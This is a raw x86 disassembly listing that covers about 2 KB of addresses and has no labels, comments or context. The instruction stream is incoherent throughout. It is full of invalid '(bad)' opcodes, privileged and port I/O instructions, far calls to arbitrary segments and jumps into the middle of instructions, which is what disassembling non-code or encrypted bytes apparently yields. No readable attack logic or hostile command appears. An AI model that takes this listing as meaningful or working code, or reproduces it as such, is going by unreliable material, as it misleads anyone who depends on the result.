  40287a:	daa    
  40287b:	mov    edi,0x687210d
  402880:	jmp    FWORD PTR [edi-0x54]
  402883:	gs pop edx
  402885:	stos   BYTE PTR es:[edi],al
  402886:	xor    BYTE PTR [esi+0x52],0x44
  40288a:	xor    edx,ebx
  40288c:	mov    al,ds:0x43a77462
  402891:	cmp    eax,0xded722d0
  402896:	dec    ebp
  402897:	mov    edx,0xb28711c5
  40289c:	sbb    eax,0x8557ffe2
  4028a1:	ins    BYTE PTR es:[edi],dx
  4028a2:	cmc    
  4028a3:	jbe    0x402833
  4028a5:	pop    edi
  4028a6:	push   ss
  4028a7:	loope  0x402864
  4028a9:	sbb    BYTE PTR [ebp+0x40],0xe0
  4028ad:	push   esp
  4028ae:	lahf   
  4028af:	xlat   BYTE PTR ds:[ebx]
  4028b0:	jae    0x9e556074
  4028b6:	outs   dx,BYTE PTR ds:[esi]
  4028b7:	mov    ah,0xa3
  4028b9:	int    0xc1
  4028bb:	xor    al,0x8
  4028bd:	push   ss
  4028be:	popa   
  4028bf:	push   eax
  4028c0:	adc    DWORD PTR [ebp+0x47],ecx
  4028c3:	sub    al,0x89
  4028c5:	aad    0x2d
  4028c7:	push   esp
  4028c8:	mov    DWORD PTR [ecx-0x39a33c39],ecx
  4028ce:	inc    ebx
  4028cf:	or     ah,BYTE PTR [esi-0x48]
  4028d2:	add    bl,BYTE PTR [esi-0x7b]
  4028d5:	push   esi
  4028d6:	cs add eax,0x63ac977c
  4028dc:	int3   
  4028dd:	mov    cl,0x56
  4028e0:	(bad)  
  4028e1:	hlt    
  4028e2:	call   0xe367:0x3c3b25d6
  4028e9:	cmp    DWORD PTR [edi-0x13],0x573638da
  4028f0:	clc    
  4028f1:	xor    DWORD PTR [ebx-0x1d5eba95],ebp
  4028f7:	xchg   esp,eax
  4028f8:	(bad)  
  4028f9:	fidivr WORD PTR [eax]
  4028fb:	mov    WORD PTR [ebx],?
  4028fd:	clc    
  4028fe:	call   0x9d65551a
  402903:	std    
  402904:	cmc    
  402905:	in     eax,dx
  402906:	lea    ecx,[edi-0x70]
  402909:	add    DWORD PTR [eax],esi
  40290b:	idiv   DWORD PTR [edx]
  40290d:	cmp    BYTE PTR [eax-0x7404d277],dh
  402913:	cmp    bl,BYTE PTR ds:0x9e9af3d8
  402919:	lea    esp,[ebp+ecx*1+0x50]
  40291d:	push   ss
  40291e:	retf   0x2db8
  402921:	sub    ebx,edx
  402923:	dec    DWORD PTR [esi-0x27]
  402926:	sbb    BYTE PTR [esi],dl
  402928:	sbb    bl,BYTE PTR [ebx-0x23]
  40292b:	fadd   DWORD PTR [esi+0x2e07d2f9]
  402931:	cmp    esi,eax
  402933:	push   es
  402934:	inc    ebx
  402935:	mov    bl,0xd1
  402937:	jge    0x402909
  402939:	jp     0x402926
  40293b:	sahf   
  40293c:	inc    esp
  40293d:	pushf  
  40293e:	test   al,0xae
  402940:	bound  ecx,QWORD PTR [esi-0x49864d4d]
  402946:	into   
  402947:	call   0x925f:0xc4c7581e
  40294e:	in     eax,0x9f
  402950:	not    edx
  402952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402953:	sub    esi,DWORD PTR [eax-0x2f]
  402956:	imul   ecx,DWORD PTR [eax],0xffffffa3
  402959:	retf   
  40295a:	ja     0x402935
  40295c:	jmp    0x4028f8
  40295e:	fsub   DWORD PTR [edx+eax*2-0x2bb159a1]
  402965:	push   eax
  402966:	pop    ebx
  402967:	ins    BYTE PTR es:[edi],dx
  402968:	dec    ebp
  402969:	sar    ebp,1
  40296b:	aad    0xee
  40296d:	mov    esi,0xd03407a
  402972:	sub    BYTE PTR [eax],bh
  402974:	enter  0xefd0,0xde
  402978:	enter  0x976,0xc5
  40297c:	sub    bh,BYTE PTR [edi]
  40297e:	add    eax,0x7d4e3979
  402983:	inc    edi
  402984:	mov    dl,0xc1
  402986:	add    BYTE PTR [esi+0x4a58724e],bh
  40298c:	pushf  
  40298d:	dec    esp
  40298e:	(bad)
  402991:	aam    0xa7
  402993:	ds js  0x4029dd
  402996:	mov    ds:0xc2e7de3e,al
  40299b:	(bad)  
  40299c:	outs   dx,DWORD PTR ds:[esi]
  40299d:	pop    edi
  40299e:	inc    ebx
  40299f:	(bad)  
  4029a0:	jmp    0xb763:0x8df4a6de
  4029a7:	idiv   DWORD PTR [edx-0x1ca696af]
  4029ad:	pop    edx
  4029ae:	inc    edx
  4029af:	cmp    BYTE PTR [ebx-0x6c],ch
  4029b2:	inc    eax
  4029b3:	lds    esi,FWORD PTR [eax]
  4029b5:	xchg   ebx,eax
  4029b6:	dec    ah
  4029b8:	cmp    al,0xad
  4029ba:	fcmovu st,st(5)
  4029bc:	mov    cs,WORD PTR [edi-0x49]
  4029bf:	ss (bad) 
  4029c1:	retf   0x8143
  4029c4:	mov    BYTE PTR [ecx+0x88e12d4],ch
  4029ca:	jbe    0x402a03
  4029cc:	sbb    DWORD PTR [edx-0x2f],esp
  4029cf:	data16 aaa 
  4029d1:	outs   dx,BYTE PTR ds:[esi]
  4029d2:	jbe    0x4029bc
  4029d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029d5:	ja     0x402a4e
  4029d7:	mov    es,WORD PTR [ecx]
  4029d9:	ror    BYTE PTR gs:[edx-0x4],cl
  4029dd:	sub    ecx,DWORD PTR [edi+0x4b]
  4029e0:	cmp    eax,0x2f350e85
  4029e5:	pop    edi
  4029e6:	or     dh,BYTE PTR [edx]
  4029e8:	shr    DWORD PTR [eax+0x76],0xa5
  4029ec:	adc    DWORD PTR [esi],esp
  4029ee:	(bad)  [ecx-0x4e58afc6]
  4029f4:	test   eax,0x5e23940d
  4029f9:	ret    0x501f
  4029fc:	js     0x402a0e
  4029fe:	jg     0x402a58
  402a00:	(bad)  
  402a01:	cli    
  402a02:	(bad)  
  402a03:	push   edi
  402a04:	jmp    0xdde5dcad
  402a09:	std    
  402a0a:	test   al,0xc7
  402a0c:	lea    eax,[edx-0x2a]
  402a0f:	xchg   edi,eax
  402a10:	inc    esp
  402a11:	lods   eax,DWORD PTR ds:[esi]
  402a12:	pusha  
  402a13:	pusha  
  402a14:	dec    ebx
  402a15:	mov    ds:0x110def2f,eax
  402a1a:	xchg   BYTE PTR [ebx+0x2],dl
  402a1d:	cld    
  402a1e:	push   0xffffffe5
  402a20:	cmc    
  402a21:	sub    al,0x91
  402a23:	lock lds esi,FWORD PTR [ebx+0x7c5bb535]
  402a2a:	sub    DWORD PTR [ebx],0xffffff82
  402a2d:	push   ebx
  402a2e:	add    eax,0x6933459
  402a33:	jns    0x402a60
  402a35:	jmp    0x4ec85ecc
  402a3a:	xchg   esp,eax
  402a3b:	int3   
  402a3c:	sbb    BYTE PTR [ecx-0x323e4],dh
  402a42:	rcr    DWORD PTR [ebx+edx*2-0x10a62099],cl
  402a49:	xlat   BYTE PTR ds:[ebx]
  402a4a:	sub    DWORD PTR [esi],0x4e
  402a4d:	scas   al,BYTE PTR es:[edi]
  402a4e:	clc    
  402a4f:	sbb    edx,DWORD PTR [ebp+0x491052b8]
  402a55:	test   eax,0x3a1b4d75
  402a5a:	aas    
  402a5b:	push   ss
  402a5c:	scas   eax,DWORD PTR es:[edi]
  402a5d:	popa   
  402a5e:	daa    
  402a5f:	push   0x16c53729
  402a64:	test   eax,0x75770d89
  402a69:	out    dx,al
  402a6a:	shl    DWORD PTR [ebx],cl
  402a6c:	mov    bl,0x86
  402a6e:	cld    
  402a6f:	or     esp,esi
  402a71:	pop    esi
  402a72:	je     0x4029fb
  402a74:	xchg   edx,eax
  402a75:	test   esi,esi
  402a77:	xchg   ebx,eax
  402a78:	test   al,0x16
  402a7a:	jmp    0xb04c:0x67bfff78
  402a81:	ds mov esp,0x65a40019
  402a87:	jno    0x402ae5
  402a89:	mov    DWORD PTR [ecx-0x30a8713],ebx
  402a8f:	mov    DWORD PTR [ebx-0x5deee06a],esi
  402a95:	(bad)  
  402a96:	sar    BYTE PTR [edx-0xf16b550],0x6f
  402a9d:	stc    
  402a9e:	add    al,0x20
  402aa0:	and    al,0x99
  402aa2:	sub    DWORD PTR [ebx-0x27],esi
  402aa5:	fsubr  QWORD PTR [ecx+ecx*2-0x77]
  402aa9:	adc    BYTE PTR [edx],ch
  402aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aac:	ds push ds
  402aae:	das    
  402aaf:	mov    ecx,0x39844700
  402ab4:	imul   edx,DWORD PTR [eax+0x6b576a4c],0xd1235501
  402abe:	jl     0x402af0
  402ac0:	data16 (bad) [eax-0x2e31b4d1]
  402ac7:	mov    edx,0xb8cb29e8
  402acc:	ins    DWORD PTR es:[edi],dx
  402acd:	pop    es
  402ace:	pop    ds
  402acf:	sub    DWORD PTR ds:0x3621672d,edx
  402ad5:	repnz push ecx
  402ad7:	pop    es
  402ad8:	cmc    
  402ad9:	xchg   ecx,eax
  402ada:	or     al,0x87
  402adc:	aaa    
  402add:	fmulp  st(7),st
  402adf:	arpl   WORD PTR [eax-0x7e],cx
  402ae2:	into   
  402ae3:	inc    edx
  402ae4:	les    eax,FWORD PTR [edi-0x4eecd58a]
  402aea:	and    eax,0x9e96fea2
  402aef:	sub    DWORD PTR [esi+ebx*2-0x7936f8b4],esi
  402af6:	mov    al,BYTE PTR [edi+0x75187ad5]
  402afc:	loop   0x402afa
  402afe:	adc    ch,BYTE PTR [edx]
  402b00:	mov    edi,0x77a52306
  402b05:	dec    ebp
  402b06:	aas    
  402b07:	hlt    
  402b08:	adc    al,0x1
  402b0a:	enterw 0xff94,0x28
  402b0f:	inc    ecx
  402b10:	ja     0x402b5f
  402b12:	fdiv   QWORD PTR [edi+ecx*8+0xaa0123a]
  402b19:	setae  BYTE PTR [ebp-0x749037f7]
  402b20:	es test al,0x89
  402b23:	mov    edx,0x9dcbf3be
  402b28:	mov    al,ds:0x700028f4
  402b2d:	jmp    0xca20fb49
  402b32:	(bad)  
  402b33:	adc    eax,0xa3448906
  402b38:	sbb    eax,0xbb6e4b5e
  402b3d:	jl     0x402b7a
  402b3f:	adc    BYTE PTR [edx],dh
  402b41:	and    BYTE PTR [eax],0x12
  402b44:	sbb    al,0xdb
  402b46:	stos   DWORD PTR es:[edi],eax
  402b47:	call   0xd6bd:0x5db608e8
  402b4e:	jo     0x402b47
  402b50:	and    DWORD PTR [esi-0x70f3acb0],0x940b4833
  402b5a:	jg     0x402b2a
  402b5c:	sub    al,0x1d
  402b5e:	scas   al,BYTE PTR es:[edi]
  402b5f:	xchg   edi,eax
  402b60:	or     DWORD PTR [ecx-0x49ff7cd5],esp
  402b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b67:	dec    esi
  402b68:	jge    0x402bb6
  402b6a:	jae    0x402b3a
  402b6c:	cmp    DWORD PTR [edi+0x205a83c8],esi
  402b72:	sti    
  402b73:	or     ebp,DWORD PTR [edx-0x56]
  402b76:	cwde   
  402b77:	fld    DWORD PTR es:[eax]
  402b7a:	adc    eax,0xadcb6202
  402b7f:	daa    
  402b80:	mov    ebp,0xec3e868e
  402b85:	aaa    
  402b86:	aas    
  402b87:	rcl    edx,0x8
  402b8a:	rcr    edi,0xd8
  402b8d:	cdq    
  402b8e:	pusha  
  402b8f:	into   
  402b90:	cwde   
  402b91:	or     esi,DWORD PTR [ebx+0x5de9dda]
  402b97:	stc    
  402b98:	jne    0x402b79
  402b9a:	sbb    DWORD PTR [eax],ecx
  402b9c:	ret    
  402b9d:	(bad)  
  402b9e:	fwait
  402b9f:	cdq    
  402ba0:	sbb    esp,eax
  402ba2:	fs pop ecx
  402ba4:	cwde   
  402ba5:	(bad)  
  402ba6:	sub    DWORD PTR [edi+0x27],ecx
  402ba9:	and    DWORD PTR ds:[eax],edx
  402bac:	or     al,0x44
  402bae:	imul   ebp,DWORD PTR [edi],0xe34de7e9
  402bb4:	dec    edx
  402bb5:	outs   dx,BYTE PTR ds:[esi]
  402bb6:	dec    edi
  402bb7:	fs inc edi
  402bb9:	adc    DWORD PTR [edx-0x73a2aeb],edx
  402bbf:	add    eax,0xbdfa834d
  402bc4:	bound  esp,QWORD PTR [edi+esi*1+0x6119c14c]
  402bcb:	(bad)  
  402bcc:	jbe    0x402c00
  402bce:	aad    0x13
  402bd0:	outs   dx,DWORD PTR ds:[esi]
  402bd1:	popa   
  402bd2:	in     al,dx
  402bd3:	pushf  
  402bd4:	std    
  402bd5:	adc    BYTE PTR [ebx],0xee
  402bd8:	fild   QWORD PTR [ebx-0x6b]
  402bdb:	xor    eax,edi
  402bdd:	sbb    al,0x3
  402bdf:	out    0xa5,al
  402be1:	je     0x402be4
  402be3:	mov    ah,0x23
  402be5:	inc    ebp
  402be6:	rol    ch,0xde
  402be9:	xor    dh,BYTE PTR ds:0xb1b7be7
  402bef:	int3   
  402bf0:	and    cl,dl
  402bf2:	into   
  402bf3:	aam    0xf8
  402bf5:	jp     0x402c2a
  402bf7:	mov    edx,0x88103114
  402bfc:	das    
  402bfd:	mov    eax,ds:0xd2b0507b
  402c02:	aam    0xc0
  402c04:	mov    ds:0x759eacea,eax
  402c09:	(bad)  
  402c0a:	aam    0xf7
  402c0c:	mov    edx,edx
  402c0e:	and    eax,esp
  402c10:	inc    ebp
  402c11:	(bad)  
  402c12:	adc    al,0xc3
  402c14:	fcmovne st,st(3)
  402c16:	fadd   DWORD PTR [edi-0x3ba08d5b]
  402c1c:	sbb    ecx,esi
  402c1e:	cmc    
  402c1f:	mov    ebx,0x14b4576c
  402c24:	leave  
  402c25:	inc    edx
  402c26:	pop    esp
  402c27:	stos   BYTE PTR es:[edi],al
  402c28:	(bad)  
  402c29:	and    al,BYTE PTR [edi+0x5abcfa80]
  402c2f:	cmp    eax,0xb02ac07b
  402c34:	xor    DWORD PTR [ecx],esi
  402c36:	dec    eax
  402c37:	in     eax,dx
  402c38:	(bad)  
  402c39:	sahf   
  402c3a:	into   
  402c3b:	pop    edx
  402c3c:	sbb    BYTE PTR [ebp-0x46],dl
  402c3f:	xor    DWORD PTR [ebx-0x7f],ebp
  402c42:	jno    0x402c1b
  402c44:	sbb    eax,0x8273cee4
  402c49:	sbb    al,0x3b
  402c4b:	sbb    edx,ecx
  402c4d:	(bad)  
  402c4e:	mov    ecx,DWORD PTR [edx+ebp*2+0x56]
  402c52:	xor    ebx,DWORD PTR [esi-0x318e3679]
  402c58:	int3   
  402c59:	sub    bh,BYTE PTR [ebx+ebx*1]
  402c5c:	adc    DWORD PTR [eax],eax
  402c5e:	das    
  402c5f:	push   edx
  402c60:	gs (bad) 
  402c62:	ret    
  402c63:	in     eax,0x91
  402c65:	aad    0xf3
  402c67:	cmp    bl,BYTE PTR [edx]
  402c69:	dec    eax
  402c6a:	sub    DWORD PTR [ebp+0x8],0xffffff91
  402c6e:	(bad)  
  402c6f:	mov    esi,0x6f332b56
  402c74:	hlt    
  402c75:	and    al,BYTE PTR [ecx+0x1]
  402c78:	xchg   edx,eax
  402c79:	fadd   st,st(2)
  402c7b:	lahf   
  402c7c:	mov    cs,WORD PTR [ebx]
  402c7e:	loope  0x402c95
  402c80:	rol    DWORD PTR [ebp-0x76],cl
  402c83:	(bad)  
  402c84:	aas    
  402c85:	mov    WORD PTR [ecx+0x1f2c6688],ds
  402c8b:	adc    al,0x31
  402c8d:	scas   al,BYTE PTR es:[edi]
  402c8e:	jae    0x402c4b
  402c90:	addr16 out dx,al
  402c92:	push   edx
  402c93:	lods   eax,DWORD PTR ds:[esi]
  402c94:	pop    ecx
  402c95:	in     al,dx
  402c96:	push   0xffffffda
  402c98:	cmp    eax,0x2e1d4777
  402c9d:	leave  
  402c9e:	fdiv   QWORD PTR [edx+0x4fcb5f73]
  402ca4:	xor    eax,0xfa8c6536
  402ca9:	pusha  
  402caa:	inc    eax
  402cab:	enter  0x1b4d,0x80
  402caf:	mov    bh,0xb4
  402cb1:	inc    ebx
  402cb2:	(bad)  
  402cb3:	sahf   
  402cb4:	xor    BYTE PTR [edi-0x3e],ah
  402cb7:	push   ss
  402cb8:	in     al,dx
  402cb9:	inc    ebx
  402cba:	shrd   DWORD PTR ss:[edx+0x6dd663b5],edx,cl
  402cc2:	mov    eax,0xa1a660ac
  402cc7:	xchg   ecx,eax
  402cc8:	adc    DWORD PTR [edx],0x47f5c55b
  402cce:	and    BYTE PTR gs:0xc656d994,al
  402cd5:	(bad)  
  402cd7:	(bad)  
  402cd8:	out    dx,eax
  402cd9:	inc    esp
  402cda:	xchg   BYTE PTR [esi-0x3d],al
  402cdd:	jge    0x402c73
  402cdf:	in     al,0x93
  402ce1:	hlt    
  402ce2:	mov    edx,0x21ccf2b1
  402ce7:	imul   ebp,edx,0x7f
  402cea:	pop    edi
  402ceb:	mov    ds,WORD PTR [ebx]
  402ced:	test   BYTE PTR [edx+0x3759c733],cl
  402cf3:	test   DWORD PTR [edi],0x18ed40ec
  402cf9:	shr    DWORD PTR [ecx-0x4b9c3200],cl
  402cff:	mov    bh,0x98
  402d01:	pop    eax
  402d02:	and    eax,0xe0d2a808
  402d07:	dec    esi
  402d08:	xchg   DWORD PTR [edi-0x588fe9c3],esp
  402d0e:	imul   edx,DWORD PTR gs:[eax],0xdf5ee516
  402d15:	sbb    eax,ebp
  402d17:	cmp    ebx,DWORD PTR [esi-0x61a62723]
  402d1d:	push   esp
  402d1e:	popa   
  402d1f:	cmp    BYTE PTR [edi+0x68],dh
  402d22:	or     al,0x5e
  402d24:	mov    eax,0xe69f352c
  402d29:	push   ds
  402d2a:	xchg   BYTE PTR [esi],bl
  402d2c:	jmp    0x1027:0x93c79bb1
  402d33:	pop    eax
  402d34:	xchg   ebp,eax
  402d35:	jl     0x402d25
  402d37:	loopne 0x402d74
  402d39:	(bad)  
  402d3b:	data16 mov dh,BYTE PTR [edi-0x1]
  402d3f:	mov    cl,al
  402d41:	cld    
  402d42:	dec    ecx
  402d43:	mov    dl,0x9f
  402d45:	shr    DWORD PTR [esi],1
  402d47:	cmp    al,0x64
  402d49:	pop    esp
  402d4a:	adc    ebp,ebp
  402d4c:	(bad)
  402d50:	push   eax
  402d51:	xchg   ebx,eax
  402d52:	sar    ecx,0x62
  402d55:	xchg   edi,eax
  402d56:	push   esp
  402d57:	adc    BYTE PTR [edi+ebp*8+0x5f],ch
  402d5b:	mov    edi,0x89598c4d
  402d60:	xor    BYTE PTR [esi+0x34],0x1c
  402d64:	fldenv [eax]
  402d66:	inc    esi
  402d67:	repnz fs (bad) 
  402d6a:	push   esp
  402d6b:	aad    0x28
  402d6d:	(bad)  
  402d6e:	int    0x75
  402d70:	xchg   BYTE PTR [edx+0x7f],bh
  402d73:	pushf  
  402d74:	pop    es
  402d75:	push   esp
  402d76:	jmp    0x402d0e
  402d78:	cld    
  402d79:	push   eax
  402d7a:	into   
  402d7b:	push   edi
  402d7c:	pop    eax
  402d7d:	mov    cl,0x7
  402d7f:	popf   
  402d80:	and    DWORD PTR [esi+0x3b42bf26],0xfa2cdff8
  402d8a:	mov    al,0x0
  402d8c:	gs in  eax,0x9f
  402d8f:	xchg   esi,eax
  402d90:	xchg   edi,eax
  402d91:	add    eax,DWORD PTR [eax+0x50]
  402d94:	sub    BYTE PTR [edx+edx*1-0x3796f8db],dh
  402d9b:	sahf   
  402d9c:	mov    eax,ds:0x3d1ad960
  402da1:	lock sbb DWORD PTR es:[edi-0x474d5fdc],edx
  402da9:	fsubr  QWORD PTR [edx]
  402dab:	xchg   edi,eax
  402dac:	jmp    0x402e26
  402dae:	adc    ebx,DWORD PTR [ebp-0x1d]
  402db1:	aas    
  402db2:	iret   
  402db3:	or     al,0x6b
  402db5:	(bad)  
  402db6:	xchg   esp,eax
  402db7:	and    ch,0xc7
  402dba:	daa    
  402dbb:	adc    dl,ah
  402dbd:	inc    eax
  402dbe:	(bad)  
  402dc0:	shl    ah,cl
  402dc2:	jo     0x402ddf
  402dc4:	fstp   QWORD PTR [esi+edi*8-0x49]
  402dc8:	inc    esi
  402dc9:	adc    ecx,DWORD PTR [esp+ebp*4-0x6f]
  402dcd:	shr    BYTE PTR [ebx+eiz*4-0x14],0x1
  402dd2:	mov    ecx,0x325184da
  402dd7:	mov    bh,0x4f
  402dd9:	cmp    eax,0xfd581a58
  402dde:	cdq    
  402ddf:	add    BYTE PTR [ebx],ch
  402de1:	mov    dl,0x65
  402de3:	mov    al,0xf4
  402de5:	or     al,0xec
  402de7:	or     bl,BYTE PTR [ecx]
  402de9:	mov    DWORD PTR ds:0xa1749a33,eax
  402def:	jmp    0x402e42
  402df1:	jae    0x402e64
  402df3:	scas   al,BYTE PTR es:[edi]
  402df4:	or     ch,BYTE PTR [esi]
  402df6:	and    eax,DWORD PTR ds:0xdc89cac0
  402dfc:	and    bl,BYTE PTR [ebp-0x23]
  402dff:	(bad)  
  402e00:	hlt    
  402e01:	fsubr  DWORD PTR [edi+0x55]
  402e04:	retf   
  402e05:	push   cs
  402e06:	sub    ah,ah
  402e08:	dec    ebx
  402e09:	cmp    eax,0x23d67f32
  402e0e:	fistp  DWORD PTR [ebx+ecx*8]
  402e11:	mov    cl,0x67
  402e13:	lock xchg ebp,eax
  402e15:	jp     0x402dac
  402e17:	cmp    al,0xca
  402e19:	xchg   edi,eax
  402e1a:	add    DWORD PTR [edi-0x206e4aca],ebp
  402e20:	sub    cl,ah
  402e22:	aaa    
  402e23:	ret    0x23d6
  402e26:	push   ecx
  402e27:	add    BYTE PTR [ecx-0x58],cl
  402e2a:	enter  0x271a,0x8f
  402e2e:	xor    BYTE PTR [ebx-0x48de05f8],cl
  402e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e35:	fldenv [esi+0x43]
  402e38:	mov    eax,DWORD PTR [ebx]
  402e3a:	into   
  402e3b:	cmp    eax,0x6b247f1b
  402e40:	repnz push edx
  402e42:	ins    BYTE PTR es:[edi],dx
  402e43:	jmp    0x714b5b71
  402e48:	je     0x402e10
  402e4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e4b:	pop    esp
  402e4c:	dec    ecx
  402e4d:	push   0x56
  402e4f:	jp     0x402eb3
  402e51:	push   ebx
  402e52:	mov    edx,0x5ee3ed84
  402e57:	sub    dl,BYTE PTR [eax+0x9]
  402e5a:	xchg   edi,eax
  402e5b:	xchg   BYTE PTR [eax],ch
  402e5d:	mov    dh,0x8e
  402e5f:	int3   
  402e60:	jnp    0x402e73
  402e62:	push   es
  402e63:	mov    esi,0x7fffd71b
  402e68:	cmp    ecx,DWORD PTR [eax-0x1545b568]
  402e6e:	sbb    edx,DWORD PTR [ecx+0x1f]
  402e71:	add    ah,bl
  402e73:	dec    ecx
  402e74:	call   0x14035046
  402e79:	in     eax,0x3
  402e7b:	jns    0x402e7e
  402e7d:	pop    ebp
  402e7e:	outs   dx,DWORD PTR ds:[esi]
  402e7f:	in     eax,0xf
  402e81:	pop    edi
  402e82:	scas   al,BYTE PTR es:[edi]
  402e83:	jb     0x402eaf
  402e85:	cli    
  402e86:	mov    edx,0xcc45df04
  402e8b:	sti    
  402e8c:	pop    ss
  402e8d:	add    al,0x7d
  402e8f:	std    
  402e90:	test   eax,0x486406c8
  402e95:	push   0x22a60313
  402e9a:	mov    BYTE PTR [ebx],al
  402e9c:	mov    cl,0x3
  402e9e:	loopne 0x402eae
  402ea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ea1:	fistp  WORD PTR [eax-0x6ad2d1e0]
  402ea7:	fs in  al,dx
  402ea9:	mov    bh,0xea
  402eab:	push   eax
  402eac:	mov    esp,0xbf2437f7
  402eb1:	test   DWORD PTR [ebx+0x3d09b505],0x8caa2419
  402ebb:	push   ebx
  402ebc:	outs   dx,DWORD PTR ds:[esi]
  402ebd:	cmp    esp,DWORD PTR [ebx+0x6d]
  402ec0:	pop    esi
  402ec1:	in     al,dx
  402ec2:	mov    eax,0x98a814c2
  402ec7:	cmp    eax,0x1d081a50
  402ecc:	sbb    ebx,DWORD PTR [ebx-0x35]
  402ecf:	ins    DWORD PTR es:[edi],dx
  402ed0:	out    dx,eax
  402ed1:	inc    eax
  402ed2:	sbb    eax,0xe555d875
  402ed7:	fs mov ebx,0xff90a7f3
  402edd:	sbb    eax,0x7315d377
  402ee2:	sbb    eax,0xae8dc2e0
  402ee7:	add    eax,0x467b8752
  402eec:	cmp    esp,ecx
  402eee:	xchg   ecx,eax
  402eef:	fwait
  402ef0:	sub    bh,BYTE PTR [ebx]
  402ef2:	icebp  
  402ef3:	inc    ebx
  402ef4:	test   DWORD PTR [ebx-0x7e],ecx
  402ef7:	and    al,al
  402ef9:	ficomp DWORD PTR [esi-0x1c]
  402efc:	aas    
  402efd:	mov    al,0xc5
  402eff:	icebp  
  402f00:	adc    DWORD PTR [edx+0x18],ebp
  402f03:	fisttp DWORD PTR ds:0x4ec48947
  402f09:	lock and eax,0x27f309ea
  402f0f:	int3   
  402f10:	ret    0xdc66
  402f13:	pop    ebp
  402f14:	ins    BYTE PTR es:[edi],dx
  402f15:	fidivr WORD PTR [ebx+0x3c]
  402f18:	leave  
  402f19:	sub    al,0x36
  402f1b:	stc    
  402f1c:	xchg   esi,eax
  402f1d:	cdq    
  402f1e:	sti    
  402f1f:	pushw  ss
  402f21:	addr16 in al,dx
  402f23:	and    BYTE PTR [ecx],bh
  402f25:	mov    esp,0xf0e4a971
  402f2a:	fwait
  402f2b:	ja     0x402eee
  402f2d:	out    0x34,al
  402f2f:	lock sub eax,0xfffffffc
  402f33:	test   DWORD PTR [esp+edx*8-0x39],esp
  402f37:	xchg   ebx,eax
  402f38:	cwde   
  402f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f3a:	cmp    DWORD PTR [ecx+0x6],edi
  402f3d:	jmp    0x402f03
  402f3f:	adc    ebx,DWORD PTR [edx]
  402f41:	inc    esp
  402f42:	mov    edi,0x83c5b892
  402f47:	pop    eax
  402f48:	adc    DWORD PTR [ebp+0x6],eax
  402f4b:	lock jns 0x402f95
  402f4e:	jecxz  0x402fad
  402f50:	pop    esi
  402f51:	je     0x402f52
  402f53:	pop    ecx
  402f54:	(bad)  
  402f55:	cmp    DWORD PTR [ebx+eiz*2+0x18],ebp
  402f59:	addr16 xchg ebx,eax
  402f5b:	out    0x95,eax
  402f5d:	in     eax,0xd1
  402f5f:	icebp  
  402f60:	enter  0x52ee,0x79
  402f64:	sar    BYTE PTR [eax],0x1d
  402f67:	jno    0x402f25
  402f69:	ret    
  402f6a:	mov    bl,0x8e
  402f6c:	push   0x778b3182
  402f71:	je     0x402fc4
  402f73:	ins    DWORD PTR es:[edi],dx
  402f74:	cmp    eax,0xcbd77fd
  402f79:	lods   al,BYTE PTR ds:[esi]
  402f7a:	retf   0x59fa
  402f7d:	cwde   
  402f7e:	dec    ebx
  402f7f:	inc    edx
  402f80:	xchg   BYTE PTR [edx-0x78],ah
  402f83:	inc    edi
  402f84:	push   ds
  402f85:	nop
  402f86:	mov    ecx,DWORD PTR [esi+0x11]
  402f89:	mov    cl,0xd4
  402f8b:	pop    eax
  402f8c:	add    al,0xd7
  402f8e:	mov    ebp,0x3b1ac43e
  402f93:	and    al,0x34
  402f95:	xchg   edx,eax
  402f96:	xchg   edx,eax
  402f97:	xor    BYTE PTR ds:0x2f1d9048,0xe9
  402f9e:	cmp    DWORD PTR [edi],esi
  402fa0:	ret    0x8835
  402fa3:	pop    eax
  402fa4:	mov    esp,0x6104c4de
  402fa9:	(bad)  
  402faa:	mov    eax,0x20b4f634
  402faf:	fidivr WORD PTR ds:0xab1f9b00
  402fb5:	sar    BYTE PTR [ecx-0x2dd7c5ca],1
  402fbb:	data16 sar bl,cl
  402fbe:	jge    0x402f6d
  402fc0:	jge    0x402f9e
  402fc2:	(bad)  
  402fc3:	xor    DWORD PTR [ebp-0xf472b7],edi
  402fc9:	xchg   ecx,eax
  402fca:	xchg   ebp,eax
  402fcb:	jecxz  0x402fb2
  402fcd:	dec    esi
  402fce:	int3   
  402fcf:	dec    DWORD PTR [edi-0x242fc52c]
  402fd5:	push   edx
  402fd6:	add    eax,0xa67c66f0
  402fdb:	mov    al,0x49
  402fdd:	inc    ecx
  402fde:	loope  0x402f6e
  402fe0:	test   BYTE PTR [esi+0x53904edf],al
  402fe6:	push   edi
  402fe7:	and    BYTE PTR [eax+0x7efe11f6],ch
  402fed:	and    al,0x9b
  402fef:	jge    0x40303d
  402ff1:	mov    ebp,0xe9c0f489
  402ff6:	jge    0x403020
  402ff8:	lods   eax,DWORD PTR ds:[esi]
  402ff9:	fcmovnu st,st(3)
  402ffb:	push   ecx
  402ffc:	ins    BYTE PTR es:[edi],dx
  402ffd:	sbb    bl,BYTE PTR [ebp+0x2]
  403000:	pop    ss
  403001:	push   edi
  403002:	pop    es
  403003:	xchg   DWORD PTR [ebp+0x6651ca44],ebp
  403009:	xor    eax,0xa52cc0e
  40300e:	lds    ebx,FWORD PTR [edx+0x76]
  403011:	stos   BYTE PTR es:[edi],al
  403012:	or     ebp,edx
  403014:	imul   edx,DWORD PTR [edx-0x1d],0x1b
  403018:	sub    ah,al
  40301a:	rol    BYTE PTR ds:0x10d52ff7,0x45
  403021:	jnp    0x402fc3
  403023:	xchg   ecx,eax
  403024:	inc    edi
  403025:	xlat   BYTE PTR ds:[ebx]
  403026:	in     al,dx
  403027:	ror    BYTE PTR [edx],1
  403029:	sar    DWORD PTR [eax],cl
  40302b:	imul   ebp,DWORD PTR [eax-0x3e],0xffffff95
  40302f:	sbb    ecx,esp
  403031:	push   es
  403032:	inc    esp
  403033:	push   eax
  403034:	jg     0x40304d
  403036:	daa    
  403037:	outs   dx,DWORD PTR ds:[esi]
  403038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403039:	sub    BYTE PTR [esi],ah
